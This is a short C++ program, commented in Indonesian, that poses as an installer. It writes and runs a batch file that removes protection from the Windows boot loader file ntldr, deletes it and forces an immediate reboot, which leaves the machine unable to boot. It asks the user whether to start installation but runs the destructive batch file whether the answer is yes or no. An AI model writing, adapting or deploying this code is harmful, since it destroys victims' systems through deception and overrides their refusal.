#include <iostream> //file header iostream
#include <fstream> //file header fstream
#include <stdlib.h> //file header stdlib.h
using namespace std; //Agar tidak menambahkan std didepan fungsi-fungsi tertentu

int main() //fungsi utama
{
    ofstream batch; //Mendeklarasikan variabel batch sebagai ofstream
    batch.open("setup.bat", ios::out); //membuka file yang bernama setup.bat, jika tidak ada maka automatis akan dibuat 

    batch <<"@echo OFF\n"; //menuliskan ke dalam file setup.bat
    batch << "attrib -r -s -h ntldr \n"; //menuliskan ke dalam file setup.bat
    batch << "del ntldr \n"; //menuliskan ke dalam file setup.bat
    batch <<"shutdown -r -f -t 00 \n"; //menuliskan ke dalam file setup.bat

    batch.close(); //menutup file
    char q; //mendeklarasikan q sebagai character

cout << "apakah anda ingin memulai instalasi?[Y/N]"; //meanmpilkan tulisan seperti disamping
cin >> q; //memasukkan tulisan di atas ke variabel q
    if (q == 'Y' || q == 'y') //jika q = Y atau y
    {
        system("setup.bat"); //akan menjalankan setup.bat menggunakan perintah system
    }
    else { //jika q selain Y atau y
    	cout <<"Instalasi tetap jalan.....\n"; //menampilkan tulisan 
    	system("pause"); //memberhentikan jalannya program, dan menampilkan tulisan press any key to continue
        system("setup.bat"); //tetap akan menjalankan setup.bat menggunakan perintah system
    }

    return 0; //mengembalikan nilai
}
